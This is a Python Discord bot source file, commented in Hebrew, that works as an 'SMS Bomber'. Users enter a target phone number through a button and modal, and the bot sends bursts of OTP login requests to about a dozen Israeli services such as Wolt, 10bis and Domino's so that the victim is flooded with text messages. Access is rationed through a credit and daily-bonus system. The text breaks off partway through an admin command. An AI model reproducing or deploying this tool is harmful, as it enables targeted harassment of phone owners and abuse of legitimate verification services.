import discord
from discord import app_commands
from discord.ext import commands
import os
import json
import httpx
import asyncio
from flask import Flask
from threading import Thread
import datetime

# --- הגדרות שרת אינטרנט למניעת קריסה ב-Render ---
app = Flask('')
@app.route('/')
def home(): return "Bot is Online!"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    Thread(target=run_flask).start()

# --- הגדרות בוט ---
TOKEN = os.getenv("DISCORD_TOKEN")
OWNER_ROLE_NAME = "Owner"
DB_FILE = "users_data.json"

def load_data():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r") as f: return json.load(f)
        except: return {"credits": {}, "blacklist": [], "last_daily": {}}
    return {"credits": {}, "blacklist": [], "last_daily": {}}

def save_data(data):
    with open(DB_FILE, "w") as f: json.dump(data, f, indent=4)

# --- מנוע ה-Spam ---
async def send_spam(phone_val):
    endpoints = [
        {"url": "https://api.wolt.com/v1/user/login/otp", "json": {"phone": f"+972{phone_val[1:]}"}},
        {"url": "https://www.10bis.co.il/NextApi/User/Login", "json": {"phoneNumber": phone_val, "isSmsAuth": True}},
        {"url": "https://pango.co.il/api/auth/login", "json": {"phone": phone_val}},
        {"url": "https://yellow.co.il/api/v1/auth/register-otp", "json": {"phone": phone_val}},
        {"url": "https://gett-israel.co.il/api/v1/auth/login", "json": {"phone": phone_val}},
        {"url": "https://pizzahut.co.il/api/v1/auth/otp", "json": {"phone": phone_val}},
        {"url": "https://www.dominos.co.il/api/v1/auth/otp", "json": {"phone": phone_val}},
        {"url": "https://rebar.co.il/api/v1/auth/login", "json": {"phone": phone_val}},
        {"url": "https://shoppers-api.super-pharm.co.il/api/v1/auth/otp", "json": {"phone": phone_val}},
        {"url": "https://ksp.co.il/api/v1/auth/send-otp", "json": {"phone": phone_val}},
        {"url": "https://www.ivory.co.il/api/v1/auth/login", "json": {"phone": phone_val}},
        {"url": "https://www.azrieli.com/api/v1/auth/otp", "json": {"phone": phone_val}}
    ]
    headers = {"User-Agent": "Mozilla/5.0"}
    async with httpx.AsyncClient(headers=headers, timeout=5.0) as client:
        for _ in range(2): # 2 סבבים
            tasks = [client.post(api["url"], json=api.get("json")) for api in endpoints]
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(3)

# --- UI Components ---
class SpamModal(discord.ui.Modal, title="Vouge Spam - SMS Bomber"):
    phone = discord.ui.TextInput(label="מספר טלפון יעד", placeholder="05XXXXXXXX", min_length=10, max_length=10)

    async def on_submit(self, interaction: discord.Interaction):
        data = load_data()
        phone_val = self.phone.value
        user_id = str(interaction.user.id)
        is_owner = discord.utils.get(interaction.user.roles, name=OWNER_ROLE_NAME)

        if phone_val in data["blacklist"]:
            return await interaction.response.send_message(f"❌ המספר {phone_val} מוגן ברשימה השחורה!", ephemeral=True)
        
        if not is_owner:
            current_credits = data["credits"].get(user_id, 0)
            if current_credits <= 0:
                return await interaction.response.send_message("❌ אין לך מספיק קרדיטים!", ephemeral=True)
            data["credits"][user_id] -= 1
            save_data(data)

        await interaction.response.send_message(f"💣 הפצצה נשלחה למספר {phone_val}!", ephemeral=True)
        await send_spam(phone_val)

class SpamView(discord.ui.View):
    def __init__(self): super().__init__(timeout=None)
    @discord.ui.button(label="Spam Phone", style=discord.ButtonStyle.danger, emoji="🚀", custom_id="spam_btn")
    async def spam_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(SpamModal())

# --- Bot Class ---
class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.members = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        self.add_view(SpamView())
        await self.tree.sync()
        print(f"✅ Synced as {self.user}")

bot = MyBot()

# --- פקודות משתמש (Slash) ---
@bot.tree.command(name="credits", description="בדיקת יתרת קרדיטים")
async def credits_check(interaction: discord.Interaction):
    data = load_data()
    balance = data["credits"].get(str(interaction.user.id), 0)
    await interaction.response.send_message(f"💰 היתרה שלך: `{balance}` קרדיטים.", ephemeral=True)

@bot.tree.command(name="daily", description="קבלת קרדיט יומי חינם")
async def daily_bonus(interaction: discord.Interaction):
    data = load_data()
    uid = str(interaction.user.id)
    today = str(datetime.date.today())
    if data.get("last_daily", {}).get(uid) == today:
        return await interaction.response.send_message("❌ כבר לקחת את הבונוס היומי שלך היום!", ephemeral=True)
    
    data["credits"][uid] = data["credits"].get(uid, 0) + 1
    if "last_daily" not in data: data["last_daily"] = {}
    data["last_daily"][uid] = today
    save_data(data)
    await interaction.response.send_message("🎁 קיבלת קרדיט 1 במתנה! נתראה מחר.", ephemeral=True)

# --- פקודות אדמין (Owner Only) ---
@bot.tree.command(name="add_credits", description="[ADMIN] הוספת קרדיטים למשתמש")
async def admin_add(interaction: discord.Interaction, member: discord.Member, amount: int):
    if not discord.utils.get(interaction.user.roles, name=OWNER_ROLE_NAME):
        return await interaction.response.send_message("❌ פ
